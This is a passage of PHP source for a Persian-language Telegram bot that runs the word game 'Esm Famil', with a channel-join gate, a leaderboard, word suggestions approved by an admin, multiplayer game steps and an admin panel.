	['text'=>"🌟 عضو شدم",'callback_data'=>"join"]
	],
              ]
        ])
		 	]);
}
}
//ارتقا دهنده دیباگ کننده سورس @DevOscar
//اولین چنل اوپن کننده @Virtualservices_3
//بی ناموسی منبع پاک کنی با افتخار به سعید افکونی
elseif($textmassage=="🗣 کلمه جدید" or $textmassage=="/addword"){	
if($tch == 'member' or $tch == 'creator' or $tch == 'administrator'){
Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🕹 اگر کلمه توسط ربات شناسایی نشده است و امتیازی به ان تعلق نگرفته است میتوانید ان در این قسمت اضافه کنید
	
🌟 کلمات ارسالی شده برای مدیر ارسال میشوند و پس از تایید مدیر به لیست کلمات اضافه میشوند
📍 بخش مورد نظر خود را برای اضافه کردن کلمه انتخاب کنید

🔘 با اضافه کردن هر کلمه صحیح دو امیتاز مثبت میگرید",
    'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"📍اسم"],['text'=>"📍فامیل"],['text'=>"📍کشور"]
				],
										[
				['text'=>"📍میوه"],['text'=>"📍حیوان"],['text'=>"📍غذا"],['text'=>"📍شهر"]
				],
										[
				['text'=>"📍رنگ"],['text'=>"📍ماشین"],['text'=>"📍گل"],['text'=>"📍اشیا"]
				],
												[
				['text'=>"🔙 برگشت"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]); 
}
else
{
			Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🍃  برای استفاده از این ربات لازم است ابتدا وارد کانال زیر شوید 

@$channel @$channel  📣
@$channel @$channel  📣

☑️ بعد از عضویت در کانال میتوانید از دکمه ها استفاده کنید",
'reply_markup'=>json_encode([
    'inline_keyboard'=>[
	[
	['text'=>"📍 عضویت در کانال",'url'=>"https://t.me/$channel"]
	],
		[
	['text'=>"🌟 عضو شدم",'callback_data'=>"join"]
	],
              ]
        ])
		 	]);
}
}
elseif($textmassage=="🏆برترین ها | رتبه من"){	
if($tch == 'member' or $tch == 'creator' or $tch == 'administrator'){
$coins = $juser["userfild"]["coin"];
Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"📍 ربات در حال پردازش رتبه های شما و نفرات برتر است منتظر باشید ...",
	  	]); 
$files = scandir("data/");
for($z = 0;$z <= count($files) -1;$z++){
$inuser = json_decode(file_get_contents("data/$files[$z]"),true);
$coin = $inuser["userfild"]["coin"];
$gettitle = pathinfo($files[$z]);
$users = $gettitle['filename'];
if(is_numeric($users)){
$result[]=$users;
$result2[]=$coin;
$result3[]=$coin;
}
}
rsort($result2);
$array = array_search($coins,$result2) + 1;
for($z = 0;$z <= 49;$z++){
if(is_numeric($result2[$z])){
$gets = array_search($result2[$z],$result3);
$stat = json_decode(file_get_contents("https://api.telegram.org/bot$token/getChatMember?chat_id=$result[$gets]&user_id=".$result[$gets]));
$name = $stat->result->user->first_name;
$zplus = $z + 1 ;
$top = $top."$zplus - $name |  $result2[$z]"."\n";
unset($result2["$z"]);
unset($result3["$gets"]);
unset($result["$gets"]);
}
}
Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🌟 رتبه شما : $array
	
🏆 50 نفر برتر ربات :
➖➖➖

$top",
'reply_markup'=>json_encode([
    'inline_keyboard'=>[
		[
	['text'=>"نفرات بعدی ➡️",'callback_data'=>"next"]
	],
              ]
        ])
	  	]); 
$juser["userfild"]["gettop"]="49";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);	
}
else
{
			Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🍃  برای استفاده از این ربات لازم است ابتدا وارد کانال زیر شوید 

@$channel @$channel  📣
@$channel @$channel  📣

☑️ بعد از عضویت در کانال میتوانید از دکمه ها استفاده کنید",
'reply_markup'=>json_encode([
    'inline_keyboard'=>[
	[
	['text'=>"📍 عضویت در کانال",'url'=>"https://t.me/$channel"]
	],
		[
	['text'=>"🌟 عضو شدم",'callback_data'=>"join"]
	],
              ]
        ])
		 	]);
}
}
elseif($textmassage=="🚦 راهنما"){	
if($tch == 'member' or $tch == 'creator' or $tch == 'administrator'){
Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🕹 اهداف بازی: سرگرمی، افزایش دقت، سرعت عمل، تمرکز، افزایش دامنه لغات و اطلاعات عمومی

👥 تعداد بازیکنان: ۲ نفر به بالا

ℹ️ شرح بازی: این بازی هم به طور فردی و هم گروهی انجام می شود،

📍 به گونه ای که اگر دو نفر بازیکن وجود داشته باشد، با هم بازی می کنند و یا اگر ۴ نفر یا ۶ نفر باشد می توانند هر ۶ نفر به طور جداگانه به رقابت بپردازند. 

📍موارد خواسته شده در جدول اختیاری است که ممکن است تا ۱۲ مورد متغیر باشد؛ به طور مثال: از نام، نام خانوادگی، نام رنگ، نام شهر، نام کشور، نام خودرو و نام حیوان تشکیل می شود.همه به حالت آماده باش منتظر می ایستند و هر یک به نوبت باید یکی از حروف الفبا را بگوید. 

📍زمانی که حرفی از حروف الفبا گفته شد، بازیکنان باید با توجه به حرف گفته شده کلماتی که با آن حرف شروع می شود، در ذیل نام های خواسته شده بنویسند.در این بازی هر کس زودتر از همه اسم ها و نام های خواسته شده را بنویسد کلمه «استپ» را می گوید که همه باید از نوشتن دست بردارند.

📍در این لحظه همه برگه ها را پایین می گذارند تا زیر نظر همه بازیکنان امتیاز شماری شود. در این بازی هر مورد صحیح ۱۰ امتیاز دارد و هم چنین اگر کلمه هایی که نوشته شده با دیگر بازیکنان مشترک باشد ۵ امتیاز خواهد داشت.در این بازی سرعت عمل و دقت مهم ترین عامل است 

🌟 ربات اسم فامیل جهت اجرای بازی به صورت خودکار ساخته شده ولی قوانین و کلیات بازی به شکل بالا است 

🤖 @$usernamebot",
	  	]); 
}
else
{
			Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🍃  برای استفاده از این ربات لازم است ابتدا وارد کانال زیر شوید 

@$channel @$channel  📣
@$channel @$channel  📣

☑️ بعد از عضویت در کانال میتوانید از دکمه ها استفاده کنید",
'reply_markup'=>json_encode([
    'inline_keyboard'=>[
	[
	['text'=>"📍 عضویت در کانال",'url'=>"https://t.me/$channel"]
	],
		[
	['text'=>"🌟 عضو شدم",'callback_data'=>"join"]
	],
              ]
        ])
		 	]);
}
}
elseif(in_array($textmassage, array("📍اسم","📍فامیل","📍کشور","📍میوه","📍حیوان","📍غذا","📍رنگ","📍ماشین","📍گل","📍اشیا","📍شهر"))){
$get = str_replace("📍","",$textmassage);
         Bot('sendmessage',[
        	'chat_id'=>$chat_id,
        	'text'=>"🌟 شما در حال اضافه کردن کلمه به بخش $get هستید 
			
📍 کلمه که میخواهید اضافه کنید مربوط به کدام حرف است",
'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"ا"],['text'=>"ب"],['text'=>"پ"],['text'=>"ت"],['text'=>"ج"],['text'=>"چ"]
				],
										[
				['text'=>"خ"],['text'=>"د"],['text'=>"ر"],['text'=>"ز"],['text'=>"س"],['text'=>"ش"]
				],
										[
				['text'=>"ع"],['text'=>"ف"],['text'=>"ق"],['text'=>"ک"],['text'=>"گ"],['text'=>"ل"]
				],
										[
				['text'=>"م"],['text'=>"ن"],['text'=>"ه"],['text'=>"ی"]
				],
													[
				['text'=>"🔙 برگشت"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]); 
$juser["userfild"]["gettab"]="$get";
$juser["userfild"]["step"]="getharfuser";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);		
}
elseif($data=="dontknow"){
$get = $cuser["userfild"]["get"];
$harf = $cuser["userfild"]["harf"];
$getplus = $get + 1;
$tab = array("اسم","فامیل","شهر","کشور","میوه","حیوان","غذا","رنگ","ماشین","گل","اشیا");
if($getplus < count($tab)){
 Bot('answercallbackquery', [
            'callback_query_id' =>$membercall,
            'text' => "😊 فدا سرت بخش بعدیو جواب بده",
            'show_alert' =>false
        ]);
Bot('editmessagetext',[
                'chat_id'=>$chatid,
     'message_id'=>$messageid,
	'text'=>"📍 بلد نبودی !
	
🔘 امیتازی برای بخش $tab[$get] نگرفتی",
	]);
	Bot('sendmessage',[
	'chat_id'=>$chatid,
	'text'=>"🗣 $tab[$getplus] با حرف `$harf` بگو",
	'parse_mode'=>'MarkDown',
	'reply_markup'=>json_encode([
    'inline_keyboard'=>[
	[
	['text'=>"🙄 نمیدونم",'callback_data'=>'dontknow']
	],
              ]
        ])
	  	]);
$cuser["userfild"]["get"]="$getplus";
$cuser["userfild"]["answer"][$get]="بلد نبودی";
$cuser = json_encode($cuser,true);
file_put_contents("data/$fromid.json",$cuser);
}
else
{
//ارتقا دهنده دیباگ کننده سورس @DevOscar
//اولین چنل اوپن کننده @Virtualservices_3
//بی ناموسی منبع پاک کنی با افتخار به سعید افکونی
Bot('editmessagetext',[
                'chat_id'=>$chatid,
     'message_id'=>$messageid,
	'text'=>"📍 بلد نبودی !
	
🔘 امیتازی برای بخش $tab[$get] نگرفتی",
	]);
Bot('sendmessage',[
	'chat_id'=>$chatid,
	'text'=>"🎮 تموم شد !
	
🌟 برای استُپ بازی روی دکمه زیر بزنید",
	    'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"🎲 استُپ"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]);
$rival = $cuser["userfild"]["rival"];
$cuser["userfild"]["step"]="instop";
$cuser["userfild"]["answer"][$get]="بلد نبودی";
$cuser = json_encode($cuser,true);
file_put_contents("data/$fromid.json",$cuser);
$inuser = json_decode(file_get_contents("data/$rival.json"),true);
$inuser["userfild"]["step"]="instop";
$inuser = json_encode($inuser,true);
file_put_contents("data/$rival.json",$inuser);
}
}
elseif($data=="dontknowmain"){
$get = $cuser["userfild"]["get"];
$harf = $cuser["userfild"]["harf"];
$getplus = $get + 1;
$tab = array("اسم","فامیل","شهر","کشور","میوه","حیوان","غذا","رنگ","ماشین","گل","اشیا");
if($getplus < count($tab)){
 Bot('answercallbackquery', [
            'callback_query_id' =>$membercall,
            'text' => "😊 فدا سرت بخش بعدیو جواب بده",
            'show_alert' =>false
        ]);
Bot('editmessagetext',[
                'chat_id'=>$chatid,
     'message_id'=>$messageid,
	'text'=>"📍 بلد نبودی !
	
🔘 امیتازی برای بخش $tab[$get] نگرفتی",
	]);
	Bot('sendmessage',[
	'chat_id'=>$chatid,
	'text'=>"🗣 $tab[$getplus] با حرف `$harf` بگو",
	'parse_mode'=>'MarkDown',
	'reply_markup'=>json_encode([
    'inline_keyboard'=>[
	[
	['text'=>"🙄 نمیدونم",'callback_data'=>'dontknowmain']
	],
              ]
        ])
	  	]);
$cuser["userfild"]["get"]="$getplus";
$cuser["userfild"]["answer"][$get]="بلد نبودی";
$cuser = json_encode($cuser,true);
file_put_contents("data/$fromid.json",$cuser);
}
else
{
Bot('editmessagetext',[
                'chat_id'=>$chatid,
     'message_id'=>$messageid,
	'text'=>"📍 بلد نبودی !
	
🔘 امیتازی برای بخش $tab[$get] نگرفتی",
	]);
Bot('sendmessage',[
	'chat_id'=>$chatid,
	'text'=>"🎮 تموم شد !
	
🌟 برای استُپ بازی روی دکمه زیر بزنید",
	    'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"استُپ 🎲"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]);
$cuser["userfild"]["step"]="none";
$cuser["userfild"]["answer"][$get]="بلد نبودی";
$cuser = json_encode($cuser,true);
file_put_contents("data/$fromid.json",$cuser);
}
}
elseif($data=="join"){
$getchannel = json_decode(file_get_contents("https://api.telegram.org/bot".$token."/getChatMember?chat_id=@".$channel."&user_id=".$fromid));
$okchannel = $getchannel->result->status;
if($okchannel != 'member' && $okchannel != 'creator' && $okchannel != 'administrator'){
       Bot('answercallbackquery', [
            'callback_query_id' =>$membercall,
            'text' => "❌ هنوز داخل کانال @$channel عضو نیستید",
            'show_alert' =>true
        ]);
}
else
{
Bot('sendmessage',[
	'chat_id'=>$chatid,
	'text'=>"🌟 به منوی اصلی ربات خوش امدید
	
📍 از دکمه های زیر استفاده کنید",
    'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"🎮 بازی شانسی[دو نفره]"]
				],
				[
				['text'=>"🏵 حساب کابری"],['text'=>"🗣 کلمه جدید"]
				],
                 [
                   ['text'=>"🚦 راهنما"],['text'=>"🏆برترین ها | رتبه من"]
                ],
									[
				['text'=>"🕹 بازی دوستانه [چند نفره]"]
				],
 	],
            	'resize_keyboard'=>true
       		])
			]);
}
}
elseif($data=="next"){
$coins = $cuser["userfild"]["coin"];
$gettop = $cuser["userfild"]["gettop"];
       Bot('answercallbackquery', [
            'callback_query_id' =>$membercall,
            'text' => "📍 در حال پردازش منتظر بمانید ...",
            'show_alert' =>false
        ]);
$files = scandir("data/");
for($z = 0;$z <= count($files) -1;$z++){
$inuser = json_decode(file_get_contents("data/$files[$z]"),true);
$coin = $inuser["userfild"]["coin"];
$gettitle = pathinfo($files[$z]);
$users = $gettitle['filename'];
if(is_numeric($users)){
$result[]=$users;
$result2[]=$coin;
$result3[]=$coin;
}
}
$gettopplus = $gettop + 50 ;
rsort($result2);
$array = array_search($coins,$result2) + 1;
for($z = $gettop;$z <= $gettopplus;$z++){
if(is_numeric($result2[$z])){
$gets = array_search($result2[$z],$result3);
$stat = json_decode(file_get_contents("https://api.telegram.org/bot$token/getChatMember?chat_id=$result[$gets]&user_id=".$result[$gets]));
$name = $stat->result->user->first_name;
$zplus = $z + 1 ;
$top = $top."$zplus - $name |  $result2[$z]"."\n";
unset($result2["$z"]);
unset($result3["$gets"]);
unset($result["$gets"]);
}
}
Bot('editmessagetext',[
                'chat_id'=>$chatid,
     'message_id'=>$messageid,
	'text'=>"🌟 رتبه شما : $array
	
🏆 نفرات برتر ربات :
➖➖➖

$top",
'reply_markup'=>json_encode([
    'inline_keyboard'=>[
		[
	['text'=>"نفرات بعدی ➡️",'callback_data'=>"next"]
	],
              ]
        ])
	  	]); 
$cuser["userfild"]["gettop"]="$gettopplus";
$cuser = json_encode($cuser,true);
file_put_contents("data/$fromid.json",$cuser);	
}
elseif($data=="ok"){
$get = $cuser["userfild"]["$messageid"];
if($get == true){
Bot('editmessagetext',[
                'chat_id'=>$chatid,
     'message_id'=>$messageid,
	'text'=>"📍 کلمه $get[0] به بخش $get[1] و حرف $get[2] اضافه شد ✅",
	]);
	Bot('sendmessage',[
                'chat_id'=>$get[3],
	'text'=>"کلمه $get[0] به بخش $get[1] و حرف $get[2] اضافه شد ✅

📍 به خاطر گزارش صحیح شما دو امتیاز مثبت به شما تعلق گرفت",
	]);
$inuser = json_decode(file_get_contents("data/$get[3].json"),true);
$coin = $inuser["userfild"]["coin"];
$coinplus = $coin + 2 ;
$inuser["userfild"]["coin"]="$coinplus";
$inuser = json_encode($inuser,true);
file_put_contents("data/$get[3].json",$inuser);	
$wordlist["wordlist"]["$get[1]"]["$get[2]"][]="$get[0]";
$wordlist = json_encode($wordlist,true);
file_put_contents("data/wordlist.json",$wordlist);	
unset($cuser["userfild"]["$messageid"]);
$cuser = json_encode($cuser,true);
file_put_contents("data/$fromid.json",$cuser);
}
else
{
Bot('editmessagetext',[
                'chat_id'=>$chatid,
     'message_id'=>$messageid,
	'text'=>"📍 درخواست به دلیل تکمیل نبدون اطلاعات حذف شد",
	]);
}
}
elseif($data=="dontok"){
$get = $cuser["userfild"]["$messageid"];
if($get == true){
Bot('editmessagetext',[
                'chat_id'=>$chatid,
     'message_id'=>$messageid,
	'text'=>"📍 درخواست برای کلمه $get[0] رد شد ✅",
	]);
		Bot('sendmessage',[
                'chat_id'=>$get[3],
	'text'=>"📍 درخواست شما برای اضافه کردن کلمه $get[0] به بخش $get[1] و حرف $get[2] رد شد ",
	]);
unset($cuser["userfild"]["$messageid"]);
$cuser = json_encode($cuser,true);
file_put_contents("data/$fromid.json",$cuser);
}
else
{
Bot('editmessagetext',[
                'chat_id'=>$chatid,
     'message_id'=>$messageid,
	'text'=>"📍 درخواست به دلیل تکمیل نبدون اطلاعات حذف شد",
	]);
}
//ارتقا دهنده دیباگ کننده سورس @DevOscar
//اولین چنل اوپن کننده @Virtualservices_3
//بی ناموسی منبع پاک کنی با افتخار به سعید افکونی
}
elseif($inline_text){
$id = base64_encode($id_from);
 Bot('answerInlineQuery', [
        'inline_query_id' =>$update->inline_query->id,
        'results' => json_encode([[
            'type' => 'article',
            'thumb_url'=>"http://uupload.ir/files/seuo_ir.fastpayam.namefamily.png",
            'id' => base64_encode(rand(5,555)),
            'title' => "🎮 ارسال بازی",
            'input_message_content' => ['parse_mode' => 'MarkDown', 'message_text' => "🎮 دوستت تورو با بازی اسم فامیل چند نفره دعوت کرده !

🌟 از طریق دکمه زیر میتونی وارد بازی بشی"],
			 'reply_markup'=>([
    'inline_keyboard'=>[
	[
	['text'=>"🎮 شروع بازی",'url'=>"https://t.me/$usernamebot?start=$id"]
	],
		[
	['text'=>"↗️ ارسال بازی برای دیگران",'switch_inline_query'=>"play"]
	],
	]
	])
        ]])
    ]);
}
elseif($juser["userfild"]["step"] == "gameplay" ){
$get = $juser["userfild"]["get"];
$harf = $juser["userfild"]["harf"];
$getplus = $get + 1;
$tab = array("اسم","فامیل","شهر","کشور","میوه","حیوان","غذا","رنگ","ماشین","گل","اشیا");
if($getplus < count($tab)){
Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🗣 $tab[$getplus] با حرف `$harf` بگو",
	'parse_mode'=>'MarkDown',
	'reply_markup'=>json_encode([
    'inline_keyboard'=>[
	[
	['text'=>"🙄 نمیدونم",'callback_data'=>'dontknow']
	],
              ]
        ])
	  	]);
$juser["userfild"]["get"]="$getplus";
$juser["userfild"]["answer"][$get]="$textmassage";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);
}
else
{
Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🎮 تموم شد !
	
🌟 برای استُپ بازی روی دکمه زیر بزنید",
	    'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"🎲 استُپ"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]);
$rival = $juser["userfild"]["rival"];
$juser["userfild"]["step"]="instop";
$juser["userfild"]["answer"][$get]="$textmassage";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);
$inuser = json_decode(file_get_contents("data/$rival.json"),true);
$inuser["userfild"]["step"]="instop";
$inuser = json_encode($inuser,true);
file_put_contents("data/$rival.json",$inuser);
}
}
elseif($juser["userfild"]["step"] == "plyamaingame" ){
$harf = $juser["userfild"]["harf"];
$get = $juser["userfild"]["get"];
$getplus = $get + 1;
$tab = array("اسم","فامیل","شهر","کشور","میوه","حیوان","غذا","رنگ","ماشین","گل","اشیا");
if($getplus < count($tab)){
Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🗣 $tab[$getplus] با حرف `$harf` بگو",
	'parse_mode'=>'MarkDown',
	'reply_markup'=>json_encode([
    'inline_keyboard'=>[
	[
	['text'=>"🙄 نمیدونم",'callback_data'=>'dontknowmain']
	],
              ]
        ])
	  	]);
$juser["userfild"]["get"]="$getplus";
$juser["userfild"]["answer"][$get]="$textmassage";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);
}
else
{
Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🎮 تموم شد !
	
🌟 برای استُپ بازی روی دکمه زیر بزنید ...",
	    'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"استُپ 🎲"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]);
$juser["userfild"]["step"]="none";
$juser["userfild"]["answer"][$get]="$textmassage";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);
}
}
elseif ($juser["userfild"]["step"] == 'setharf') {
if ($textmassage != "برگشت 🔙"){
$horof = array("ا","ب","پ","ت","ج","چ","خ","د","ر","ز","س","ش","ع","ف","ق","ک","گ","ل","م","ن","ه","ی");
if(in_array($textmassage, $horof)) {
$gamer = $juser["userfild"]["ingame"];
$game = $gamerlist["$gamer"]["gamer"];
Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"🌟 حرف توسط شما انتخاب شد بازی در حال اغاز شدن است ...",
'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"انصراف از بازی 🔙"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]);
for($z = 0;$z <= count($game) -1;$z++){
Bot('sendmessage',[
	'chat_id'=>$game[$z],
	'text'=>"📍 حرف انتخاب شد
	
اسم با حرف `$textmassage` بگو",
	'parse_mode'=>'MarkDown',
		'reply_markup'=>json_encode([
    'inline_keyboard'=>[
	[
	['text'=>"🙄 نمیدونم",'callback_data'=>'dontknow']
	],
              ]
        ])
	  	]);
$inuser = json_decode(file_get_contents("data/$game[$z].json"),true);	
$inuser["userfild"]["step"]="plyamaingame";
$inuser["userfild"]["get"]="0";
$inuser["userfild"]["harf"]="$textmassage";
$inuser = json_encode($inuser,true);
file_put_contents("data/$game[$z].json",$inuser);
}
}
else
{
         Bot('sendmessage',[
        	'chat_id'=>$chat_id,
        	'text'=>"📍 باید یکی از حروف الفبا را وارد کنید",
 ]);
}
}
}
elseif ($juser["userfild"]["step"] == 'getharfuser') {
if ($textmassage != "برگشت 🔙"){
$horof = array("ا","ب","پ","ت","ج","چ","خ","د","ر","ز","س","ش","ع","ف","ق","ک","گ","ل","م","ن","ه","ی");
if(in_array($textmassage, $horof)) {
         Bot('sendmessage',[
        	'chat_id'=>$chat_id,
        	'text'=>"🗣 کلمه که میخواهید اضافه شود را وارد کنید",
			'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"🔙 برگشت"]
				],
 	],
            	'resize_keyboard'=>true
       		])
 ]);
$juser["userfild"]["step"]="addworduser";
$juser["userfild"]["getharf"]="$textmassage";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);	
}
else
{
         Bot('sendmessage',[
        	'chat_id'=>$chat_id,
        	'text'=>"📍 باید یکی از حروف الفبا را وارد کنید",
 ]);
}
}
}
elseif ($juser["userfild"]["step"] == 'addworduser') {
if ($textmassage != "برگشت 🔙"){
$tab = $juser["userfild"]["gettab"];
$harf = $juser["userfild"]["getharf"];
if(!in_array($textmassage, $wordlist["wordlist"]["$tab"]["$harf"])) {
         Bot('sendmessage',[
        	'chat_id'=>$chat_id,
        	'text'=>"🌟 درخواست امتیاز دهی برای این کلمه با موفقیت برای مدیر ارسال شد
			
📍 در صورت تایید مدیر این کلمه به بخش کلمات داری امتیاز اضافه خواهد شد،
📌 تشکر بابت درخواست شما ",
    'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"🎮 بازی شانسی[دو نفره]"]
				],
				[
				['text'=>"🏵 حساب کابری"],['text'=>"🗣 کلمه جدید"]
				],
                 [
                   ['text'=>"🚦 راهنما"],['text'=>"🏆برترین ها | رتبه من"]
                ],
									[
				['text'=>"🕹 بازی دوستانه [چند نفره]"]
				],
 	],
            	'resize_keyboard'=>true
       		])
 ]);
$id = Bot('sendmessage',[
        	'chat_id'=>$Dev[0],
        	'text'=>"📍 یک درخواست برای اضافه کردن کلمه ارسال شد،
			
📍 کلمه : $textmassage
📍 برای بخش : $tab
📍 برای حرف : $harf",
	'reply_markup'=>json_encode([
    'inline_keyboard'=>[
	[
	['text'=>"✅ تایید",'callback_data'=>'ok']
	],
		[
	['text'=>"❌ رد درخواست",'callback_data'=>'dontok']
	],
              ]
        ])
 ]);
$plusmsg = $id->result->message_id;
$juser["userfild"]["step"]="none";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);	
$inuser = json_decode(file_get_contents("data/$Dev[0].json"),true);	
$inuser["userfild"]["$plusmsg"][]="$textmassage";
$inuser["userfild"]["$plusmsg"][]="$tab";
$inuser["userfild"]["$plusmsg"][]="$harf";
$inuser["userfild"]["$plusmsg"][]="$from_id";
$inuser = json_encode($inuser,true);
file_put_contents("data/$Dev[0].json",$inuser);	
}
else
{
         Bot('sendmessage',[
        	'chat_id'=>$chat_id,
        	'text'=>"📍 کلمه وارد شده قبلا در لیست کلمات بوده است",
 ]);
}
}
}
//ارتقا دهنده دیباگ کننده سورس @DevOscar
//اولین چنل اوپن کننده @Virtualservices_3
//بی ناموسی منبع پاک کنی با افتخار به سعید افکونی
//panel admin

elseif($textmassage=="/panel" or $textmassage=="panel" or $textmassage=="مدیریت"){
if ($tc == "private") {
if (in_array($from_id,$Dev)){
Bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"🚦 ادمین عزیز به پنل مدریت ربات خوش امدید",
	  'reply_markup'=>json_encode([
    'keyboard'=>[
	  	  	 [
		['text'=>"📍 امار ربات"],['text'=>"📍 افزودن کلمه"]             
		 ],
 	[
	  	['text'=>"📍 ارسال به همه"],['text'=>"📍 فروارد همگانی"]
	  ],
	  	[
	  	['text'=>"📍 حذف کلمه"],['text'=>"📍 بکاپ از دیتا بیس"]
	  ],
	  [
	  	['text'=>"باقی مانده اشتراک ❗️"]
	  ],
   ],
      'resize_keyboard'=>true
   ])
 ]);
}
}
}
elseif($textmassage=="برگشت 🔙"){
if ($tc == "private") {
if (in_array($from_id,$Dev)){
Bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"🚦 به منوی مدیریت بازگشتید",
	  'reply_markup'=>json_encode([
    'keyboard'=>[
	  	  	 [
		['text'=>"📍 امار ربات"],['text'=>"📍 افزودن کلمه"]             
		 ],
 	[
	  	['text'=>"📍 ارسال به همه"],['text'=>"📍 فروارد همگانی"]
	  ],
	  	[
	  	['text'=>"📍 حذف کلمه"],['text'=>"📍 بکاپ از دیتا بیس"]
	  ],
	  [
	  	['text'=>"باقی مانده اشتراک ❗️"]
	  ],
   ],
      'resize_keyboard'=>true
   ])
 ]);
$juser["userfild"]["file"]="none";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);		
}
}
}
elseif($textmassage=="📍 بکاپ از دیتا بیس"){
if (in_array($from_id,$Dev)){
				Bot('sendmessage',[
		'chat_id'=>$chat_id,
		'text'=>"📌 از دیتا بیس کلمات بکاپ گرفته شد",
		]);
file_put_contents("wordlist.json",file_get_contents("data/wordlist.json"));
		}
}
elseif($textmassage=="باقی مانده اشتراک ❗️"){
if (in_array($from_id,$Dev)){
				Bot('sendmessage',[
		'chat_id'=>$chat_id,
		'text'=>"تا پایان اشتراک شما $day روز باقی مانده است ✅
",
]);
		}
}
elseif($textmassage=="📍 امار ربات"){
if (in_array($from_id,$Dev)){
$files1 = scandir("data/");
$all = count($files1);
				Bot('sendmessage',[
		'chat_id'=>$chat_id,
		'text'=>"🤖 امار ربات شما : 
		
📌 تعداد عضو ها : $all",
                'hide_keyboard'=>true,
		]);
		}
}
elseif($textmassage=="📍 حذف کلمه"){
if (in_array($from_id,$Dev)){
Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"📍 بخش مورد نطر را برای حذف کلمه انتخاب کنید",
    'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"📌اسم"],['text'=>"📌فامیل"],['text'=>"📌کشور"]
				],
										[
				['text'=>"📌میوه"],['text'=>"📌حیوان"],['text'=>"📌غذا"],['text'=>"📌شهر"]
				],
										[
				['text'=>"📌رنگ"],['text'=>"📌ماشین"],['text'=>"📌گل"],['text'=>"📌اشیا"]
				],
												[
				['text'=>"برگشت 🔙"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]); 
		}
}
elseif(in_array($textmassage, array("📌اسم","📌فامیل","📌کشور","📌میوه","📌حیوان","📌غذا","📌رنگ","📌ماشین","📌گل","📌اشیا","📌شهر"))){
$get = str_replace("📌","",$textmassage);
if (in_array($from_id,$Dev)){
         Bot('sendmessage',[
        	'chat_id'=>$chat_id,
        	'text'=>"📍 شما در حال حذف از کلمه به بخش $get هستید 
			
📍 کلمه که میخواهید حذف کنید مربوط به کدام حرف است",
    'reply_markup'=>json_encode([
            	'keyboard'=>[
												[
				['text'=>"برگشت 🔙"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]); 
$juser["userfild"]["gettab"]="$get";
$juser["userfild"]["file"]="getharf2";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);		
}
}
elseif ($juser["userfild"]["file"] == 'getharf2') {
if ($textmassage != "برگشت 🔙"){
$horof = array("ا","ب","پ","ت","ج","چ","خ","د","ر","ز","س","ش","ع","ف","ق","ک","گ","ل","م","ن","ه","ی");
if(in_array($textmassage, $horof)) {
         Bot('sendmessage',[
        	'chat_id'=>$chat_id,
        	'text'=>"📍 کلمه که میخواهید حذف شود را وارد کنید",
	  'reply_to_message_id'=>$message_id,
 ]);
$juser["userfild"]["file"]="removeword";
$juser["userfild"]["getharf"]="$textmassage";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);	
}
else
{
         Bot('sendmessage',[
        	'chat_id'=>$chat_id,
        	'text'=>"📍 باید یکی از حروف الفبا را وارد کنید",
 ]);
}
}
}
elseif ($juser["userfild"]["file"] == 'removeword') {
if ($textmassage != "برگشت 🔙"){
$tab = $juser["userfild"]["gettab"];
$harf = $juser["userfild"]["getharf"];
if(in_array($textmassage, $wordlist["wordlist"]["$tab"]["$harf"])) {
         Bot('sendmessage',[
        	'chat_id'=>$chat_id,
        	'text'=>"حذف شد ✔️
			
📍 اگر میخواهید کلمه دیگر حذف کنید ان را ارسال کنید",
	  'reply_to_message_id'=>$message_id,
 ]);
$array = array_search($textmassage,$wordlist["wordlist"]["$tab"]["$harf"]);
unset($wordlist["wordlist"]["$tab"]["$harf"]["$array"]);
